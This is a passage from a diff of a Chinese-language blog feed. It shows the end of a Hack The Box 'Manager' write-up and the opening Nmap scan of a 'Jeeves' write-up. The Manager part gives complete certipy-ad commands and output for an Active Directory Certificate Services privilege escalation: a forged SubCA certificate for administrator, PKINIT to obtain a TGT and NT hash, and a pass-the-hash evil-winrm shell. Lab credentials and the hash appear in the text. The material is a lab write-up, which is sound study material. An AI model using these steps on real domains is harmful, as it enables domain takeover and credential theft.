+</span></span><span style="display:flex;"><span>    DirectoryEmailReplication
+</span></span><span style="display:flex;"><span>    DomainControllerAuthentication
+</span></span><span style="display:flex;"><span>    KerberosAuthentication
+</span></span><span style="display:flex;"><span>    EFSRecovery
+</span></span><span style="display:flex;"><span>    EFS
+</span></span><span style="display:flex;"><span>    DomainController
+</span></span><span style="display:flex;"><span>    WebServer
+</span></span><span style="display:flex;"><span>    Machine
+</span></span><span style="display:flex;"><span>    User
+</span></span><span style="display:flex;"><span>    Administrator
+</span></span></code></pre></div><p>SubCA 模版本来是给下级 CA 用的，特点是允许申请者自行指定 subject，扩展密钥用途放的很宽，因此成了伪造任意身份证书的入口。正常情况下只有管理员能注册它。upn 的值会写进证书的 SAN，后续认证时 PKINT 就按这个字段认人。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad req -u Raven@manager.htb -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -ca <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> -template <span style="color:#e6db74">&#39;SubCA&#39;</span> -upn <span style="color:#e6db74">&#39;administrator@manager.htb&#39;</span> -dc-ip 10.129.58.202
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Got error <span style="color:#66d9ef">while</span> requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span style="color:#66d9ef">do</span> not allow the current user to enroll <span style="color:#66d9ef">for</span> this type of certificate.
+</span></span><span style="display:flex;"><span>Would you like to save the private key? <span style="color:#f92672">(</span>y/N<span style="color:#f92672">)</span>: y
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving private key to <span style="color:#e6db74">&#39;19.key&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote private key to <span style="color:#e6db74">&#39;19.key&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Failed to request certificate
+</span></span></code></pre></div><p>用 ManagerCa 把当前帐户添加进审核员角色，签发取得证书。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad ca -ca <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> -add-officer <span style="color:#e6db74">&#39;Raven&#39;</span> -u Raven@manager.htb -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.129.58.202
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added officer <span style="color:#e6db74">&#39;Raven&#39;</span> on <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad ca -ca <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> -issue-request <span style="color:#ae81ff">19</span> -u Raven@manager.htb -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.129.58.202
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully issued certificate request ID <span style="color:#ae81ff">19</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah 19.key
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3539054</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 1.7K Oct <span style="color:#ae81ff">20</span> 02:07 19.key
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad req -u Raven@manager.htb -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -ca <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> -retrieve <span style="color:#ae81ff">19</span> -dc-ip 10.129.58.202 
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving certificate with ID <span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;administrator@manager.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Loaded private key from <span style="color:#e6db74">&#39;19.key&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><p>拿到证书后走 PKINIIT 认证，换回的是目标帐户的 TGT 和 NT hash。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.58.202
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     SAN UPN: <span style="color:#e6db74">&#39;administrator@manager.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;administrator@manager.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator@manager.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+</span></span></code></pre></div><p>使用 hash 登录拿到 Administrator。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.58.202 -u administrator -H ae5064c2f62317332c88629e025924ef
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>manager<span style="color:#ae81ff">\a</span>dministrator
+</span></span></code></pre></div>]]></content></item><item><title>HTB-Jeeves Writeup</title><link>https://enilmalus.github.io/posts/htb-jeeves-writeup/</link><pubDate>Wed, 14 Oct 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-jeeves-writeup/</guid><description>Nmap 探测 使用 nmap 探测存活的端口。
 ┌──(kali㉿kali)-[~/Work/Kali/Jeeves] └─$ sudo nmap --min-rate 10000 -p- 10.129.228.112 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-13 21:48 -0400 Nmap scan report for 10.129.228.112 Host is up (0.11s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 50000/tcp open ibm-db2 Nmap done: 1 IP address (1 host up) scanned in 14.</description><content type="html"><![CDATA[<h2 id="nmap-探测">Nmap 探测</h2>
 <p>使用 nmap 探测存活的端口。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Jeeves<span style="color:#f92672">]</span>
